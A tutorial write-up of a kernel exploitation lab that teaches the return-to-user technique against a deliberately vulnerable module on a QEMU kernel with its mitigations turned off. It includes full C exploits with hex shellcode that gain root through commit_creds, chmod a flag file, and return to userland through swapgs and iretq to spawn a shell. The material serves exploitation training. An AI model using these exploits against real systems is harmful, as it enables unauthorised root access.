# return to user

In this lab(?) we are going to exploit a kernel with the following primitives/conditions.

```
1. arbitrary read/write and a stack leak
2. no kalsr
3. no smep, smap or KPTI
```

Most files are in the `image` directory. `./compress.sh` compiles your `exploit.c` in your `exploit` directory and merges it into the initial filesystem. `./boot.sh` boots the vm with the following conditions above. no need to look at `./decompress.sh`; it decompresses `rootfs.cpio` to `initramfs` directory, but it is not needed unless you accidentally delete or corrupt the initramfs directory.

The vulnerable kernel module is located at `src/vuln.ko`. You should load this onto IDA or any sort of analyzer and check what it does. Also the source code for the module is located at `src/vuln.c` and `src/vuln.h` so cross-check it out with the disassembly.

## basics
In this session, we are going to practice the technique return to user. All other techniques (kernel rop, physmap spray) are based on this technique, so it is very important that we understand it thoroughly.

The basic idea is to overwrite a kernel function pointer to a userspace RWX region with prepared shellcode. However, there are 3 parts that have 'realistic' difficulties. Let's go through them each.

## 1. Finding what to overwrite
There are many ways to control RIP, but in this case we are going to overwrite the `file_operations` structure in the vulnerable kernel module. I chose this because it is rather easy to find and trigger. 

Since there is no KASLR, kernel modules and kernel code is not randomized. We can find their addresses by looking at the `/proc/kallsyms` and `/proc/modules` files. But to view them, we must be root, or else the addresses are hidden. So we edit line 12 in `initramfs/etc/init.d/rcS` file to `setsid cttyhack setuidgid 0 sh` so that we boot as root, instead of uid1000. Then we run `./compress.sh` and `./boot.sh` in order and we get a root shell.

```
/ # cat /proc/modules
vuln 16384 0 - Live 0xffffffffc0000000 (PO)

/ # cat /proc/kallsyms | grep vuln
ffffffffc0000010 t copy_overflow	[vuln]
ffffffffc0000143 t vuln_exit	[vuln]
ffffffffc0000143 t cleanup_module	[vuln]
ffffffffc0000000 t vuln_open	[vuln]
ffffffffc0000140 t vuln_release	[vuln]
ffffffffc0000030 t vuln_ioctl	[vuln]
```

If we re-boot the address doesn't change. This is because we disabled kaslr.
From the leaks, we can know that the vulnerable kernel module base is 0xffffffffc0000000. The offset of `vuln_fops` is 0x3c0, so let's look it up in the debugger. (We need to add `-s` argument to `boot.sh`, boot it and connect to gdbstub via `target remote localhost:1234`)

When we try to dump the address 0xffffffffc00003c0, there are nothing but zeros. Something is going horribly wrong... I guessed that the .data section must have a separate base, and tried to find the address manually by looking at the assembly code for `vuln_init`.

```
pwndbg> x/i 0xffffffffc0000143
   0xffffffffc0000143:	mov    rdi,0xffffffffc0002480
pwndbg> 
   0xffffffffc000014a:	call   0xffffffff8143f640
pwndbg> 
   0xffffffffc000014f:	mov    rdi,0xffffffffc00010e8
pwndbg> 
   0xffffffffc0000156:	jmp    0xffffffff810a9359
```

What the fuck? The assembly is different from what I saw in IDA. But one thing is for sure: the `vuln_dev` structure is located at 0xffffffffc0002480 so I take a look at it.

```
pwndbg> x/100gx 0xffffffffc0002480
0xffffffffc0002480:	0x0000000000000039	0xffffffffc000113f
0xffffffffc0002490:	0xffffffffc0002000	0xffffffff822467c0
0xffffffffc00024a0:	0xffffffff822b05e0	0x0000000000000000
0xffffffffc00024b0:	0xffff888002b72400	0x0000000000000000
```

The shape of `struct miscdevice` is the following
```
struct miscdevice  {
	int minor;
	const char *name;
	const struct file_operations *fops;
	struct list_head list;
	struct device *parent;
	struct device *this_device;
	const struct attribute_group **groups;
	const char *nodename;
	umode_t mode;
};
```

Therefore `vuln_fops` must be located at 0xffffffffc0002000. Let's take a look at it.

```
pwndbg> x/100gx 0xffffffffc0002000
0xffffffffc0002000:	0x0000000000000000	0x0000000000000000
0xffffffffc0002010:	0x0000000000000000	0x0000000000000000
0xffffffffc0002020:	0x0000000000000000	0x0000000000000000
0xffffffffc0002030:	0x0000000000000000	0x0000000000000000
0xffffffffc0002040:	0x0000000000000000	0xffffffffc0000030
0xffffffffc0002050:	0x0000000000000000	0x0000000000000000
0xffffffffc0002060:	0x0000000000000000	0xffffffffc0000000
0xffffffffc0002070:	0x0000000000000000	0xffffffffc0000140
```

As you can see there are 3 pointers, (0xffffffffc0000030 = ioctl, 0xffffffffc0000000 = open, 0xffffffffc0000140 = release). By overwriting 0xffffffffc0002068 to some other value and calling `open("dev/vuln")` in userspace, we can get RIP control in kernel space. Let's test it out with the following proof of concept code.

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>

#define VULN_READ 0x1111
#define VULN_WRITE 0x2222
#define VULN_STACK 0x3333

struct rwRequest {
	void *kaddr;
	void *uaddr;
	size_t length;
};

int Open(char *fname, int mode) {
	int fd;
	if ((fd = open(fname, mode)) < 0) {
		perror("open");
		exit(-1);
	}
	return fd;
}

void write64(unsigned long kaddr, unsigned long value) {

	struct rwRequest req;
	unsigned long value_ = value;

	req.uaddr = &value_;
	req.length = 8;
	req.kaddr = (void *)kaddr;

	int fd = Open("/dev/vuln", O_RDONLY);

	if (ioctl(fd, VULN_WRITE, &req) < 0) {
		perror("ioctl");
		exit(-1);
	}
}

int main (int argc, char **argv){

	write64(0xffffffffc0002068, 0xcafebebedeadbeef);
	open("/dev/vuln", O_RDONLY);
	return 0;
	
}
```

Now to execute this in the vm, just do (1) write the code in `exploit/exploit.c`, (2) execute `./compress.sh` and `./boot.sh` sequentially. The binary will be stored in `/home/ctf/runme`, and running it give us the following result:

```
[    8.982661] RIP: 0010:0xcafebebedeadbeef
[    8.982788] Code: Bad RIP value.
[    8.982864] RSP: 0018:ffffc900000d7c60 EFLAGS: 00000282
[    8.982990] RAX: cafebebedeadbeef RBX: ffffffffc0002480 RCX: ffff888003358920
[    8.983153] RDX: ffff8880031f9880 RSI: ffff888002b18800 RDI: ffff888002b305b8
[    8.983339] RBP: 0000000000000039 R08: 0000000000000000 R09: 0000000000000000
[    8.983576] R10: ffffc900000d7cc8 R11: 0000000000000000 R12: ffff888002b18800
[    8.983762] R13: ffff888002b305b8 R14: ffffffffc0002000 R15: ffff888002b18800
```

Now we have RIP control, nice!

## 2. What code should we run

In userspace exploits, shellcode usually did `execve("/bin/sh", NULL, NULL)`. That doesn't work for kernelspace, because the goal isn't spawning a shell (and even if it was, we cannot use syscalls) The goal is to change our uid to root. There are two ways to do this.
```
1. locate the cred structure, change the uid, euid, gid fields to 0
2. execute commit_creds(prepare_kernel_cred(0))
```

There is a dirty 3rd option, which will be discussed later.
```
3. escalate to root, chmod the flag file to 777 and loop forever, while another userspace thread reads the flag file.
```

The 1st option is becoming harder and harder due to structure randomization in the linux kernel. The second one is very easy. First, we find the address of the functions `commit_creds` and `prepare_kernel_cred`.

```
/ # cat /proc/kallsyms | grep commit_creds
ffffffff8107bd20 T commit_creds
/ # cat /proc/kallsyms | grep prepare_kernel_cred
ffffffff8107c0a0 T prepare_kernel_cred
```

So basically our shellcode should be this:

```nasm
xor rdi, rdi
mov rcx, 0xffffffff8107c0a0
call rcx
mov rdi, rax
mov rcx, 0xffffffff8107bd20
call rcx
ret
```

The last instruction is `ret`, and this is perfectly fine because the `vuln_open` function originally returned with a `ret` instruction as well, and due to the coherency of the calling convention, it should work fine. Let's check it out.

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>

#define VULN_READ 0x1111
#define VULN_WRITE 0x2222
#define VULN_STACK 0x3333

struct rwRequest {
	void *kaddr;
	void *uaddr;
	size_t length;
};

int Open(char *fname, int mode) {
	int fd;
	if ((fd = open(fname, mode)) < 0) {
		perror("open");
		exit(-1);
	}
	return fd;
}

void write64(unsigned long kaddr, unsigned long value) {

	struct rwRequest req;
	unsigned long value_ = value;

	req.uaddr = &value_;
	req.length = 8;
	req.kaddr = (void *)kaddr;

	int fd = Open("/dev/vuln", O_RDONLY);

	if (ioctl(fd, VULN_WRITE, &req) < 0) {
		perror("ioctl");
		exit(-1);
	}
}

unsigned long leak_stack() {
	struct rwRequest req;
	unsigned long stack;

	int fd = Open("/dev/vuln", O_RDONLY);

	req.uaddr = &stack;
	if (ioctl(fd, VULN_STACK, &req) < 0) {
		perror("ioctl");
		exit(-1);
	}

	return stack;
}

int main (int argc, char **argv){
	/*
	xor rdi, rdi
	mov rcx, 0xffffffff8107c0a0
	call rcx
	mov rdi, rax
	mov rcx, 0xffffffff8107bd20
	call rcx
	ret
	*/
	char sc[] = "\x48\x31\xFF\x48\xC7\xC1\xA0\xC0\x07\x81\xFF\xD1\x48\x89\xC7\x48\xC7\xC1\x20\xBD\x07\x81\xFF\xD1\xC3";

	void *sc_addr = mmap((void *)0xdead000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_FIXED|MAP_PRIVATE, -1, 0);
	if (sc_addr == MAP_FAILED) {
		perror("mmap");
		exit(-1);
	}

	memcpy(sc_addr, sc, sizeof(sc));
	write64(0xffffffffc0002068, sc_addr);
	open("/dev/vuln", O_RDONLY);
	system("/bin/sh");

	return 0;
}
```

The char array `sc` is the assembled version of the shellcode I wrote earlier. Now let's run it.

```
/ $ /home/ctf/runme
/ # id
uid=0(root) gid=0(root)
```

Booyah! It works beautifully.

## 3. Dirty ways

Sometimes it is not possible to return beautifully with a single `ret` instruction as in the previous example. One example is if the vulnerability is a stack buffer overflow, and PC control is obtained via overwritten return address. In this case, we have two options:
```
1. switch from kernel space to user space directly.
2. escalate to root, chmod 777 /flag, and loop forever while another thread is reads the flag
```

The 2nd option seems much easier, although it is a lot more dirtier and CTF-oriented. Let's try it out. To chmod the flag, we need to find the address of the chmod function.

```
/ # cat /proc/kallsyms | grep chmod
ffffffff811a0830 t chmod_common
ffffffff811a1ab0 T ksys_fchmod
ffffffff811a1b30 T __x64_sys_fchmod
ffffffff811a1b40 T __ia32_sys_fchmod
ffffffff811a1b50 T do_fchmodat
ffffffff811a1bd0 T __x64_sys_fchmodat
ffffffff811a1bf0 T __ia32_sys_fchmodat
ffffffff811a1c10 T __x64_sys_chmod
ffffffff811a1c30 T __ia32_sys_chmod
ffffffff811fca00 T __posix_acl_chmod
ffffffff811fcde0 T posix_acl_chmod
ffffffff8121e190 T sysfs_chmod_file
```

So, the chmod handler is `ffffffff811a1c10 T __x64_sys_chmod`, let's write some shellcode with it. But first, we need to know how arguments are set up for the system call handler. Let's take a look at the assembly via debugger. First, we set a breakpoint at 0xffffffff811a1c10 and execute `chmod 777 /flag` in the shell. We trap into the breakpoint.

```
► 0xffffffff811a1c10    movzx  edx, word ptr [rdi + 0x68]
  0xffffffff811a1c14    mov    rsi, qword ptr [rdi + 0x70]
  0xffffffff811a1c18    mov    edi, 0xffffff9c
  0xffffffff811a1c1d    call   0xffffffff811a1b50
 
  0xffffffff811a1c22    cdqe   
  0xffffffff811a1c24    ret
```

It seems that 0xffffffff811a1b50 is the main routine, and the code before it sets the arguments for it.
```
 RAX  0xffffffff811a1c10 ◂— 0x70778b486857b70f
 RBX  0x0
 RCX  0x0
 RDX  0x1ff
 RDI  0xffffff9c
 RSI  0x7ffca5064f7b ◂— 0x53550067616c662f /* '/flag' */
 R8   0x0
 R9   0x0
 R10  0x0
 R11  0x0
 R12  0x0
 R13  0x0
 R14  0x0
 R15  0x0
 RBP  0xffffc900000c7f58 —▸ 0x4506bb ◂— push   r13 /* 0x55d5894954415541 */
 RSP  0xffffc900000c7f38 —▸ 0xffffffff81002213 ◂— 0x48b486550458948
 RIP  0xffffffff811a1c1d ◂— 0xc39848ffffff2ee8
─────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────
   0xffffffff811a1c10    movzx  edx, word ptr [rdi + 0x68]
   0xffffffff811a1c14    mov    rsi, qword ptr [rdi + 0x70]
   0xffffffff811a1c18    mov    edi, 0xffffff9c
 ► 0xffffffff811a1c1d    call   0xffffffff811a1b50
 
   0xffffffff811a1c22    cdqe   
   0xffffffff811a1c24    ret
```

So, we can see that in order to chmod 777, we have to set RDI to 0xffffff9c, RSI to "/flag" and RDX to 0x1ff (0777) and call 0xffffffff811a1b50. Now this is our new exploit.

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <pthread.h>

#define VULN_READ 0x1111
#define VULN_WRITE 0x2222
#define VULN_STACK 0x3333

struct rwRequest {
	void *kaddr;
	void *uaddr;
	size_t length;
};

int Open(char *fname, int mode) {
	int fd;
	if ((fd = open(fname, mode)) < 0) {
		perror("open");
		exit(-1);
	}
	return fd;
}

void write64(unsigned long kaddr, unsigned long value) {

	struct rwRequest req;
	unsigned long value_ = value;

	req.uaddr = &value_;
	req.length = 8;
	req.kaddr = (void *)kaddr;

	int fd = Open("/dev/vuln", O_RDONLY);

	if (ioctl(fd, VULN_WRITE, &req) < 0) {
		perror("ioctl");
		exit(-1);
	}
}

unsigned long leak_stack() {
	struct rwRequest req;
	unsigned long stack;

	int fd = Open("/dev/vuln", O_RDONLY);

	req.uaddr = &stack;
	if (ioctl(fd, VULN_STACK, &req) < 0) {
		perror("ioctl");
		exit(-1);
	}

	return stack;
}

void read_flag() {
	char buf[0x100];
	memset(buf, 0, sizeof(buf));

	while(1) {
		int fd = open("/flag", O_RDONLY);
		if (fd != -1) {
			puts("[+] succeeded in reading the flag!");
			read(fd, buf, sizeof(buf));
			printf("the flag is: %s\n", buf);
			exit(-1);
		}
	}
}

int main (int argc, char **argv){
	/*
	xor rdi, rdi
	mov rcx, 0xffffffff8107c0a0
	call rcx
	mov rdi, rax
	mov rcx, 0xffffffff8107bd20
	call rcx
	mov r15, 0x67616c662f
	push r15
	mov rdi, 0xffffff9c
	mov rsi, rsp
	mov rdx, 0777
	mov rcx, 0xffffffff811a1b50
	call rcx
	jmp $
	*/

	pthread_t tid;
	char sc[] = "\x48\x31\xFF\x48\xC7\xC1\xA0\xC0\x07\x81\xFF\xD1\x48\x89\xC7\x48\xC7\xC1\x20\xBD\x07\x81\xFF\xD1\x49\xBF\x2F\x66\x6C\x61\x67\x00\x00\x00\x41\x57\x48\xBF\x9C\xFF\xFF\xFF\x00\x00\x00\x00\x48\x89\xE6\x48\xC7\xC2\xFF\x01\x00\x00\x48\xC7\xC1\x50\x1B\x1A\x81\xFF\xD1\xEB\xFE";

	void *sc_addr = mmap((void *)0xdead000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_FIXED|MAP_PRIVATE, -1, 0);
	if (sc_addr == MAP_FAILED) {
		perror("mmap");
		exit(-1);
	}

	memcpy(sc_addr, sc, sizeof(sc));
	write64(0xffffffffc0002068, sc_addr);
	pthread_create(&tid, NULL, read_flag, NULL);
	open("/dev/vuln", O_RDONLY);

	return 0;
}
```

However, it doesn't work. I set a breakpoint on 0xdead000 and investigate the return value of the function call 0xffffffff811a1b50. The error number is 14, which is bad address. Maybe I shouldn't use a kernel address for storing "/flag" string. I should use 0xdeadf00, which is a userspace address. So I use this instead.

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <pthread.h>

#define VULN_READ 0x1111
#define VULN_WRITE 0x2222
#define VULN_STACK 0x3333

struct rwRequest {
	void *kaddr;
	void *uaddr;
	size_t length;
};

int Open(char *fname, int mode) {
	int fd;
	if ((fd = open(fname, mode)) < 0) {
		perror("open");
		exit(-1);
	}
	return fd;
}

void write64(unsigned long kaddr, unsigned long value) {

	struct rwRequest req;
	unsigned long value_ = value;

	req.uaddr = &value_;
	req.length = 8;
	req.kaddr = (void *)kaddr;

	int fd = Open("/dev/vuln", O_RDONLY);

	if (ioctl(fd, VULN_WRITE, &req) < 0) {
		perror("ioctl");
		exit(-1);
	}
}

unsigned long leak_stack() {
	struct rwRequest req;
	unsigned long stack;

	int fd = Open("/dev/vuln", O_RDONLY);

	req.uaddr = &stack;
	if (ioctl(fd, VULN_STACK, &req) < 0) {
		perror("ioctl");
		exit(-1);
	}

	return stack;
}

void read_flag() {
	char buf[0x100];
	memset(buf, 0, sizeof(buf));

	while(1) {
		int fd = open("/flag", O_RDONLY);
		if (fd != -1) {
			puts("[+] succeeded in reading the flag!");
			read(fd, buf, sizeof(buf));
			printf("the flag is: %s\n", buf);
			exit(-1);
		}
	}
}

int main (int argc, char **argv){
	/*
	xor rdi, rdi
	mov rcx, 0xffffffff8107c0a0
	call rcx
	mov rdi, rax
	mov rcx, 0xffffffff8107bd20
	call rcx
	mov r15, 0x67616c662f
	mov r14, 0xdeadf00
	mov [r14], r15
	mov rdi, 0xffffff9c
	mov rsi, r14
	mov rdx, 0777
	mov rcx, 0xffffffff811a1b50
	call rcx
	jmp $
	*/

	pthread_t tid;
	char sc[] = "\x48\x31\xFF\x48\xC7\xC1\xA0\xC0\x07\x81\xFF\xD1\x48\x89\xC7\x48\xC7\xC1\x20\xBD\x07\x81\xFF\xD1\x49\xBF\x2F\x66\x6C\x61\x67\x00\x00\x00\x49\xC7\xC6\x00\xDF\xEA\x0D\x4D\x89\x3E\x48\xBF\x9C\xFF\xFF\xFF\x00\x00\x00\x00\x4C\x89\xF6\x48\xC7\xC2\xFF\x01\x00\x00\x48\xC7\xC1\x50\x1B\x1A\x81\xFF\xD1\xEB\xFE";

	void *sc_addr = mmap((void *)0xdead000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_FIXED|MAP_PRIVATE, -1, 0);
	if (sc_addr == MAP_FAILED) {
		perror("mmap");
		exit(-1);
	}

	memcpy(sc_addr, sc, sizeof(sc));
	write64(0xffffffffc0002068, sc_addr);
	pthread_create(&tid, NULL, read_flag, NULL);
	open("/dev/vuln", O_RDONLY);

	return 0;
}
```

It still doesn't work. However, the return value is 0 now, so `chmod`ing works. My guess for this is that the thread does not allow to switch to other threads, since kernel threads aren't pre-emptive, meaning that a thread only switches context if it actively calls the appropriate API. I need to find a way to context switch to another thread. A rather easy way to force context switch is to sleep the current thread. I searched google about how to do this, and [here](https://stackoverflow.com/questions/39876457/how-to-sleep-in-the-linux-kernel-space/39921020) was a decent answer. Now at the end of our shellcode, we should replace the inifinite loop with call to sleep. We are going to use msleep.

```
/ # cat /proc/kallsyms | grep sleep
ffffffff8103a680 T x86_acpi_enter_sleep_state
ffffffff81076450 T wq_worker_sleeping
ffffffff810866a0 T sched_clock_idle_sleep_event
ffffffff8109d4a0 T lock_system_sleep
ffffffff8109d4c0 T unlock_system_sleep
ffffffff8109d930 t mem_sleep_show
ffffffff8109dae0 t mem_sleep_store
ffffffff8109f690 t hibernation_debug_sleep
ffffffff810c4730 T msleep
ffffffff810c4760 T msleep_interruptible
```

So our new shellcode is
```nasm
; commit_cred(prepare_kernel_creds(0))
xor rdi, rdi
mov rcx, 0xffffffff8107c0a0
call rcx
mov rdi, rax
mov rcx, 0xffffffff8107bd20
call rcx

; chmod 777 flag
mov r15, 0x67616c662f
mov r14, 0xdeadf00
mov [r14], r15
mov rdi, 0xffffff9c
mov rsi, r14
mov rdx, 0777
mov rcx, 0xffffffff811a1b50
call rcx

; msleep(0x1000000)
mov rdi, 0x1000000
mov rcx, 0xffffffff810c4730
call rcx
int 3
```

Still it doesn't work. I guess maybe it's because two threads of the same process are scheduled together? So what I did was, I ran the exploit in background and read the flag in the shell.

```
/ $ /home/ctf/runme &
/ $ ls
bin      flag     lib      media    proc     sbin     usr
dev      home     lib64    mnt      root     sys      var
etc      init     linuxrc  opt      run      tmp      vuln.ko
/ $ ls -al flag
-rwxrwxrwx    1 root     root            24 Nov  2 07:32 flag
/ $ cat flag
this is an example flag
/ $ 
```

Awesome! Now after 0x1000000 miliseconds int3 instruction will be executed and the kernel will panic. But who cares~ What I need is the flag.

## Gracefully returning to usermode

Now I am going to try option.1, which was to switch from kernel space to user space. To do this, we need to know how mode switches are made. To investigate this in detail, look at the code [here](https://github.com/torvalds/linux/blob/master/arch/x86/entry/entry_64.S).

Basically, there are special instructions that allow us to return from kernel space to userspace, such as `SYSRET`, `SYSEXIT` and `IRET`. `SYSRET` and `IRET` are available on all CPU vendors and is included in the x86_64 standard, so we will be using one of them. I looked at the semantics of `SYSRET` and realized it requires writing to a Model-Specific-Regiseter([MSR](https://wiki.osdev.org/Model_Specific_Registers)) which is overcomplicated for writing an exploit. So we are going to use `IRET` for our exploit.

Let's take a look at the semantics of `IRET` in x86_64. I referenced the [AMD64 ISA manual](http://www.scs.stanford.edu/05au-cs240c/lab/amd64/AMD64-3.pdf), page 309: return from interrupt. Since we are in protected mode, this is the semantics for IRETQ.

```
IRET_PROTECTED:
 IF (RFLAGS.NT=1) // iret does a task-switch to a previous task
 IF (LEGACY_MODE)
 	TASK_SWITCH // using the ’back link’ field in the tss
 ELSE // (LONG_MODE)
 	EXCEPTION [#GP(0)] // task switches aren’t supported in long mode
 
 POP.v temp_RIP
 POP.v temp_CS
 POP.v temp_RFLAGS

 IF ((temp_RFLAGS.VM=1) && (CPL=0) && (LEGACY_MODE))
 	IRET_FROM_PROTECTED_TO_VIRTUAL

 temp_CPL = temp_CS.rpl
 IF ((64BIT_MODE) || (temp_CPL!=CPL))
 {
 POP.v temp_RSP // in 64-bit mode, iret always pops ss:rsp
 POP.v temp_SS
 }
 CS = READ_DESCRIPTOR (temp_CS, iret_chk)
 IF ((64BIT_MODE) && (temp_RIP is non-canonical) || (!64BIT_MODE) && (temp_RIP > CS.limit))
 {
 	EXCEPTION [#GP(0)]
 }

 CPL = temp_CPL
 IF ((started in 64-bit mode) || (changing CPL))
 // ss:rsp were popped, so load them into the registers
 {
	SS = READ_DESCRIPTOR (temp_SS, ss_chk)
 	RSP.s = temp_RSP
 }

 IF (changing CPL)
 {
 	FOR (seg = ES, DS, FS, GS)
 	IF ((seg.attr.dpl < CPL) && ((seg.attr.type = ’data’) || (seg.attr.type = ’non-conforming-code’)))
 	{
 		seg = NULL // can’t use lower dpl data segment at higher cpl
 	}
 }
 
 RFLAGS.v = temp_RFLAGS // VIF,VIP,IOPL only changed if (old_CPL=0)
 // IF only changed if (old_CPL<=old_RFLAGS.IOPL)
 // VM unchanged
 // RF cleared
 RIP = temp_RIP
 EXIT
```

Also a more graphical representation can be found [here](https://os.phil-opp.com/returning-from-exceptions/). So basically, we are popping the following registers in order: RIP, CS, RFLAGS, RSP, SS. 

Also, in the linux syscall entry assembly code, there is the instruction SWAPGS right before the instruction return. 

```gas
SWAPGS
INTERRUPT_RETURN
```

Looking at the manual again, it tells us that SWAPGS does this: `Exchange GS base with KernelGSBase MSR`. So basically when we entered the system call we exchanged the userspace GS with the KernelGSBase MSR, so when we exit the system call and return to userland, we need to do this once more to retstore GS.

So our new shellcode should be something like the following:

```nasm
xor rdi, rdi
mov rcx, 0xffffffff8107c0a0
call rcx
mov rdi, rax
mov rcx, 0xffffffff8107bd20
call rcx

swapgs

push userspace_ss
push userspace_rsp
push userspace_rflags
push userspace_cs
push userspace_rip
iretq
```

The userspace rip and stack can be made easily with an mmap system call. However, the CS, SS and RFLAGS are rather unfamiliar. Let's first go through RFLAGS. RFLAGS is the extended version of the FLAGS register (similar to how RAX and EAX is the extended version of AX). The structure of EFLAGS (32bit) is the following.

![alt text](EFLAGS.png "EFLAGS")

RFLAGS has bits 32~61 set to 0, so basically RFLAGS is the zero extended version of EFLAGS. Let's execute any program and show all the registers. It shows

```
rax            0xfffffffffffffe00	-512
rbx            0x0	0
rcx            0x7ffff7af4081	140737348845697
rdx            0x2000	8192
rsi            0x555555771a60	93824994450016
rdi            0x0	0
rbp            0x555555771a60	0x555555771a60 <basebuf>
rsp            0x7fffffffdcc8	0x7fffffffdcc8
r8             0x555555774e6b	93824994463339
r9             0x0	0
r10            0x555555774010	93824994459664
r11            0x246	582
r12            0x55555556a109	93824992321801
r13            0x0	0
r14            0x1	1
r15            0x0	0
rip            0x7ffff7af4081	0x7ffff7af4081 <__GI___libc_read+17>
eflags         0x246	[ PF ZF IF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
```

So, the EFLAGS register is set to 0x246, with 3 flags (Parity, Zero, and InterruptEnable). We can set this equally as well.

Now comes the SS and CS. According to the debugger, the CS and SS are 0x33 and 0x2b respectively. What does that imply? I conducted a lot of searches to find out what CS and SS means in x86_64 but none were clear. However, [this](https://ubuntuforums.org/showthread.php?t=1828881) helped a bit. So we can conclude that all segment registers are indexes to a global data structure in the CPU, and the entries inside them are the real addresses. If I am wrong or anyone wants to elaborate, plz do a PR or contact me via [twitter](https://twitter.com/pr0cf51) or any viable method.

However, none of that is acutally important in exploitation. We just need to know that CS should be 0x33, SS should be 0x2b, and RFLAGS should be 0x246. simple.

So here is our final shellcode.
```nasm
xor rdi, rdi
mov rcx, 0xffffffff8107c0a0
call rcx
mov rdi, rax
mov rcx, 0xffffffff8107bd20
call rcx

swapgs

; ss
mov r15, 0x2b
push 0x2b 

; rsp
mov r15, 0xcafe000
push r15

; rflags
mov r15, 0x246
push r15

; cs
mov r15, 0x33
push r15

; rip
mov r15, 0x1234000
push r15

iretq
```

And we need to map the address 0xcafe000 to the stack and 0x1234000 to the final userland code we will execute. So our final exploit is this.

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>

#define VULN_READ 0x1111
#define VULN_WRITE 0x2222
#define VULN_STACK 0x3333

struct rwRequest {
	void *kaddr;
	void *uaddr;
	size_t length;
};

int Open(char *fname, int mode) {
	int fd;
	if ((fd = open(fname, mode)) < 0) {
		perror("open");
		exit(-1);
	}
	return fd;
}

void write64(unsigned long kaddr, unsigned long value) {

	struct rwRequest req;
	unsigned long value_ = value;

	req.uaddr = &value_;
	req.length = 8;
	req.kaddr = (void *)kaddr;

	int fd = Open("/dev/vuln", O_RDONLY);

	if (ioctl(fd, VULN_WRITE, &req) < 0) {
		perror("ioctl");
		exit(-1);
	}
}

unsigned long leak_stack() {
	struct rwRequest req;
	unsigned long stack;

	int fd = Open("/dev/vuln", O_RDONLY);

	req.uaddr = &stack;
	if (ioctl(fd, VULN_STACK, &req) < 0) {
		perror("ioctl");
		exit(-1);
	}

	return stack;
}

int main (int argc, char **argv){
	/*
xor rdi, rdi
mov rcx, 0xffffffff8107c0a0
call rcx
mov rdi, rax
mov rcx, 0xffffffff8107bd20
call rcx

swapgs

; ss
mov r15, 0x2b
push 0x2b 

; rsp
mov r15, 0xcafe000
push r15

; rflags
mov r15, 0x246
push r15

; cs
mov r15, 0x33
push r15

; rip
mov r15, 0x1234000
push r15

iretq
	*/
	char sc[] = "\x48\x31\xFF\x48\xC7\xC1\xA0\xC0\x07\x81\xFF\xD1\x48\x89\xC7\x48\xC7\xC1\x20\xBD\x07\x81\xFF\xD1\x0F\x01\xF8\x49\xC7\xC7\x2B\x00\x00\x00\x6A\x2B\x49\xC7\xC7\x00\xE0\xAF\x0C\x41\x57\x49\xC7\xC7\x46\x02\x00\x00\x41\x57\x49\xC7\xC7\x33\x00\x00\x00\x41\x57\x49\xC7\xC7\x00\x40\x23\x01\x41\x57\x48\xCF";
	char final[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";

	void *sc_addr = mmap((void *)0xdead000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_FIXED|MAP_PRIVATE, -1, 0);
	if (sc_addr == MAP_FAILED) {
		perror("mmap");
		exit(-1);
	}

	void *userland_code = mmap((void *)0x1234000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_FIXED|MAP_PRIVATE, -1, 0);
	if (userland_code == MAP_FAILED) {
		perror("mmap");
		exit(-1);
	}
	memcpy(userland_code, final, sizeof(final));

	void *userland_stack = mmap((void *)0xcafe000, 0x1000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE|MAP_GROWSDOWN, -1, 0);
	if (userland_stack == MAP_FAILED) {
		perror("mmap");
		exit(-1);
	}

	memcpy(sc_addr, sc, sizeof(sc));
	write64(0xffffffffc0002068, sc_addr);
	open("/dev/vuln", O_RDONLY);

	return 0;
}
```

You should notice that the stack is mapped with the flag MAP_GROWSDOWN set, which enables memory growth of that region.

The result: it works beautifully. Now if we omit the swapgs instruction, it becomes a nightmare.

```
[    5.633951] PANIC: double fault, error_code: 0x0
[    5.635387] CPU: 0 PID: 1036 Comm: runme Tainted: P           O      4.19.76 #1
[    5.635698] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
[    5.636511] RIP: 0010:error_entry+0x22/0xf0
[    5.636795] Code: f9 ff ff 0f 1f 44 00 00 fc 56 48 8b 74 24 08 48 89 7c 24 08 52 31 d2 51 31 c9 50 41 50 45 31 c0 41 51 45 31 c9 41 52 45 31 d2 <41> 53 45 31 db 53 31 db 55 31 ed 41 54 45 31 e4 41 55 45 31 ed 41
[    5.637615] RSP: 0000:fffffe0000002000 EFLAGS: 00000046
[    5.637895] RAX: 0000000081a00ad7 RBX: 0000000000000000 RCX: 0000000000000000
[    5.638156] RDX: 0000000000000000 RSI: ffffffff81a00f58 RDI: fffffe00000020a8
[    5.638534] RBP: 000000000000500c R08: 0000000000000000 R09: 0000000000000000
[    5.638882] R10: 0000000000000000 R11: 0000000000000000 R12: fffffe00000020a8
[    5.639089] R13: 0000000000000000 R14: 0000000000000000 R15: 0000000000000000
[    5.639265] FS:  000055555697f880(0000) GS:ffff888003600000(0000) knlGS:0000000000000000
[    5.639468] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    5.639631] CR2: fffffe0000001ff8 CR3: 0000000002b32000 CR4: 00000000000006f0
[    5.639830] Call Trace:
